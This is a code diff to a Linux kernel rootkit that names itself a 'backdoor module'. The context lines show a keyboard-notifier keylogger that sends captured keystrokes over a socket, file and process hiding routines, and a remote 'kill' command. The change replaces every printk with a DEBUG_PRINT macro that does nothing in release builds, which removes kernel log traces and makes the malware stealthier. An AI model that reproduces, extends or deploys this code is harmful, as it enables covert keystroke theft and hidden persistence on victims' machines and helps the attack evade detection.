@@ -39,6 +39,12 @@
 #define UNIX_SOCK_PATH ("/run/systemd/system/stdout")
 #endif
 
+#ifndef NDEBUG
+#define DEBUG_PRINT(...) printk(__VA_ARGS__)
+#else
+#define DEBUG_PRINT(...) ((void)0)
+#endif
+
 static asmlinkage void (*change_pidR)(
         struct task_struct* task, enum pid_type type, struct pid* pid);
 static asmlinkage struct pid* (*alloc_pidR)(struct pid_namespace* ns);
@@ -305,7 +311,7 @@ int send_msg(struct socket* sock, unsigned char* buf, size_t len) {
 
     size = kernel_sendmsg(sock, &msg, &iov, 1, len);
 
-    printk(KERN_INFO "Sent %d bytes out of %lu\n", size, len);
+    DEBUG_PRINT(KERN_INFO "Sent %d bytes out of %lu\n", size, len);
 
     return size;
 }
@@ -326,7 +332,7 @@ void read_TLS(struct work_struct* work) {
 
     memset(buffer, 0, MAX_PAYLOAD);
     len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
-    printk(KERN_INFO "Received message from server %*.s\n", len, buffer);
+    DEBUG_PRINT(KERN_INFO "Received message from server %*.s\n", len, buffer);
     if (len < 5) {
         buffer[0] = 'm';
         strcpy(buffer + 1, bad_len);
@@ -380,7 +386,7 @@ void read_TLS(struct work_struct* work) {
         strcpy(buffer + 1, clear);
         send_msg(svc->tls_socket, buffer, strlen(clear) + 1);
     } else if (memcmp("kill", buffer, 4) == 0) {
-        printk(KERN_INFO "Killswitch engaged\n");
+        DEBUG_PRINT(KERN_INFO "Killswitch engaged\n");
         show();
         strcpy(buffer, "foobar");
         send_msg(svc->tls_socket, buffer, strlen("foobar"));
@@ -446,7 +452,7 @@ int init_userspace_conn(void) {
     //TLS socket
     error = sock_create(AF_UNIX, SOCK_STREAM, 0, &svc->tls_socket);
     if (error < 0) {
-        printk(KERN_ERR "cannot create socket\n");
+        DEBUG_PRINT(KERN_ERR "cannot create socket\n");
         return error;
     }
     sun.sun_family = AF_UNIX;
@@ -454,7 +460,7 @@ int init_userspace_conn(void) {
 
     error = kernel_connect(svc->tls_socket, (struct sockaddr*) &sun, sizeof(sun), 0);
     if (error < 0) {
-        printk(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
+        DEBUG_PRINT(KERN_ERR "cannot connect on tls socket, error code: %d\n", error);
         return error;
     }
 
@@ -583,7 +589,7 @@ int keysniffer_cb(struct notifier_block* nblock, unsigned long code, void* _para
         return NOTIFY_OK;
     }
 
-    printk(KERN_INFO "Keycode: %s\n", keycode);
+    DEBUG_PRINT(KERN_INFO "Keycode: %s\n", keycode);
 
     keylog_data = keycode;
 
@@ -604,7 +610,7 @@ void consume_keys(struct work_struct* work) {
     strcpy((char*) buffer + 1, keystroke);
 
     send_msg(svc->tls_socket, buffer, strlen((const char*) buffer));
-    printk(KERN_INFO "Sent keystroke %s\n", keystroke);
+    DEBUG_PRINT(KERN_INFO "Sent keystroke %s\n", keystroke);
 }
 
 static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len, loff_t off,
@@ -713,7 +719,7 @@ bool hide_file(const char* user_input, struct hidden_file* hf) {
         user_file[str_size - i - 1] = tmp;
     }
 
-    printk(KERN_INFO "Dir \"%s\"\tFile \"%s\"\n", user_dir, user_file);
+    DEBUG_PRINT(KERN_INFO "Dir \"%s\"\tFile \"%s\"\n", user_dir, user_file);
 
     if (kern_path(user_dir, 0, &hf->path)) {
         kfree(user_dir);
@@ -780,7 +786,7 @@ static int __init mod_init(void) {
 
     svc = kmalloc(sizeof(struct service), GFP_KERNEL);
     if ((err = init_userspace_conn()) < 0) {
-        printk(KERN_ALERT "Failed to initialize userspace sockets; error code %d\n", err);
+        DEBUG_PRINT(KERN_ALERT "Failed to initialize userspace sockets; error code %d\n", err);
         kfree(svc);
 
         nf_unregister_net_hook(&init_net, &nfho);
@@ -797,10 +803,10 @@ static int __init mod_init(void) {
 
     hide();
 
-    printk(KERN_ALERT "backdoor module loaded\n");
+    DEBUG_PRINT(KERN_ALERT "backdoor module loaded\n");
 
     register_keyboard_notifier(&keysniffer_blk);
-    printk(KERN_ALERT "backdoor module loaded\n");
+    DEBUG_PRINT(KERN_ALERT "backdoor module loaded\n");
     return 0;
 }
 
@@ -837,7 +843,7 @@ static void __exit mod_exit(void) {
     if (svc) {
         if (svc->tls_socket) {
             sock_release(svc->tls_socket);
-            printk(KERN_INFO "release tls_socket\n");
+            DEBUG_PRINT(KERN_INFO "release tls_socket\n");
         }
         kfree(svc);
     }
@@ -862,7 +868,7 @@ static void __exit mod_exit(void) {
         }
     }
     write_unlock(my_tasklist_lock);
-    printk(KERN_ALERT "removed backdoor module\n");
+    DEBUG_PRINT(KERN_ALERT "removed backdoor module\n");
 }
 
 module_init(mod_init);
